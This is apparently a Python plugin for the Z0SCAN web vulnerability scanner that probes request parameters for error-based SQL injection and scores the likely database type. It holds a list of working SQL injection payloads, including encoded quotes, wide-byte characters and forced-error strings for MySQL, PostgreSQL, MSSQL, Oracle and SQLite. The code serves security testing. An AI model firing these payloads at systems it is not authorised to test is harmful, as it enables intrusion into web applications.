#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# w8ay 2020/5/10
# JiuZero 2025/7/29
from config.others.sqli_errors import rules
from api import generateResponse, random_num, random_str, VulType, Type, PluginBase, conf, logger, Threads, KB
from lib.helper.helper_sensitive import sensitive_page_error_message_check
from lib.helper.paramanalyzer import VulnDetector
import re

class Z0SCAN(PluginBase):
    name = "sqli-error"
    desc = 'SQL Error-based Injection'
    version = "2025.7.29"
    risk = 2
        
    def __init__(self):
        super().__init__()
        # 报错注入概率计算相关参数
        self.ERROR_THRESHOLD = 0.6  # 报错注入概率阈值
        self.DBMS_CONFIDENCE = {
            'MySQL': 0.9,
            'PostgreSQL': 0.85,
            'Microsoft SQL': 0.8,
            'Oracle': 0.75,
            'SQLite': 0.7
        }
    
    def calculate_error_probability(self, error_match, dbms_type):
        """
        计算报错注入存在的概率（完全按照DetSQL原有逻辑）
        :param error_match: 正则匹配到的错误信息
        :param dbms_type: 数据库类型
        :return: 报错注入存在的概率(0.0-1.0)
        """
        # 基础概率基于数据库类型
        probability = self.DBMS_CONFIDENCE.get(dbms_type, 0.5)
        
        # 根据错误信息特征调整概率
        error_text = error_match.group()
        
        # 明确的SQL语法错误
        if any(term in error_text.lower() for term in ['syntax', 'sql', 'query']):
            probability = min(probability + 0.2, 1.0)
        
        # 数据库特定错误代码
        elif re.search(r'(ORA-\d+|Msg \d+|Error \d+)', error_text):
            probability = min(probability + 0.15, 1.0) 
        return probability
    
    def audit(self):
        if not self.fingerprints.waf and self.risk in conf.risk and conf.level != 0:
            _payloads = [
                r"'\")",
                ## 宽字节
                r'鎈\'"\(',
                ## 通用报错
                r';)\\\'\\"',
                r'\' oRdeR bY 500 ',
                r';`)',
                r'\\', 
                r"%%2727", 
                r"%25%27", 
                r"%60", 
                r"%5C",
            ]
            if conf.level == 3: 
                _payloads += [
                ## 强制报错
                # MySQL
                r'\' AND 0xG1#',
                # PostgreSQL  
                r"' AND 'a' ~ 'b\[' -- ",
                # MSSQL
                r"; RAISERROR('Error generated', 16, 1) -- ", 
                # Oracle
                r"' UNION SELECT XMLType('<invalid><xml>') FROM dual -- ",  
                # SQLite
                r"' UNION SELECT SUBSTR('o', -1, 1) -- ",
                ]
    
            iterdatas = self.generateItemdatas()
            z0thread = Threads(name="sqli-error")
            z0thread.submit(self.process, iterdatas, _payloads)
    
    def Get_sql_errors(self):
        sql_errors = []
        for database, re_strings in rules.items():
            for re_string in re_strings:
                sql_errors.append((re.compile(re_string, re.IGNORECASE), database))
        return sql_errors
    
    def process(self, _, _payloads):
        k, v, position = _
        if not VulnDetector(self.requests.url).is_sql_injection(k, v):
            return
        for _payload in _payloads:
            payload = self.insertPayload({
                "key": k, 
                "value": v, 
                "position": position, 
                "payload": _payload
                })
            if "鎈" in _payload or "%" in _payload:
                quote = False
            else: quote = True
            r = self.req(position, payload, quote=quote)
            if not r:
                continue
            html = r.text
            for sql_regex, dbms_type in self.Get_sql_errors():
                match = sql_regex.search(html)
                if match:
                    # 计算报错注入概率
                    probability = self.calculate_error_probability(match, dbms_type)
                    result = self.generate_result()
                    result.main({
                        "type": Type.REQUEST, 
                        "url": self.requests.url, 
                        "vultype": VulType.SQLI, 
                        "show": {
                            "Position": f"{position} >> {k}",
                            "Payload": payload, 
                            "Msg": f"DBMS_TYPE Maybe {dbms_type} (Probability: {probability:.2f})"
                            }
                        })
                    result.step("Request1", {
                        "request": r.reqinfo, 
                        "response": generateResponse(r), 
                        "desc": f"DBMS_TYPE Maybe {dbms_type} (Probability: {probability:.2f})"
                        })
                    self.success(result)
                    return True
            message_lists = sensitive_page_error_message_check(html)
            # 在SQL报错注入过程中检测到未知报错
            if message_lists:
                # 计算未知错误的概率 (固定为中等置信度)
                probability = 0.5
                result = self.generate_result()
                result.main({
                    "type": Type.REQUEST, 
                    "url": self.requests.url, 
                    "vultype": VulType.SENSITIVE, 
                    "show": {
                        "Position": f"{position} >> {k}",
                        "Payload": payload, 
                        "Msg": f"Receive Error Msg {repr(message_lists)} (Probability: {probability:.2f})"
                        }
                    })
                result.step("Request1", {
                    "request": r.reqinfo, 
                    "response": generateResponse(r), 
                    "desc": f"Receive Error Msg {repr(message_lists)} (Probability: {probability:.2f})"
                    })
                self.success(result)
                break